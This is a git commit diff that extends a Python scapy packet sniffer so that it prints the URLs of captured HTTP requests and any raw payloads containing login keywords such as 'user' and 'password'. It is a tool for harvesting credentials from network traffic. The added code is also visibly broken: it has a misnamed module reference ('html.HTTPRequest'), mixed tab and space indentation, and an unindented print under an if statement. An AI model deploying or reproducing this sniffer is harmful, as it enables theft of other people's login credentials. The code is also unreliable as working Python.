2a57c7c013c86f6f17f806f50592378b333db814
Vernieri <31966345+vernieri@users.noreply.github.com>
2018-10-05 16:05:09 -0300

    Update sniff.py

--- network/sniff.py
+++ network/sniff.py
@@ -1,11 +1,21 @@
 #! /usr/bin/env python
 import scapy.all as scapy
+from scapy.layers import http
 
 def sniff(interface):
 	scapy.sniff(iface=interface, store=False, prn=cb)
 
 def cb(packet):
-	print(packet) 
+  if packet.haslayer(http.HTTPRequest):
+    url = packet[html.HTTPRequest].Host + packet[http.HTTPRequest].Path
+    print(url)
+    if packet.haslayer(scapy.Raw):
+      load = packet[scapy.Raw].load
+      keywords = ["username", "user", "login", "password", "pass"]
+      for keyword in keywords:
+        if keyword in load:
+        print(load)
+        break
 
 #choose your interface
 sniff("eth0")
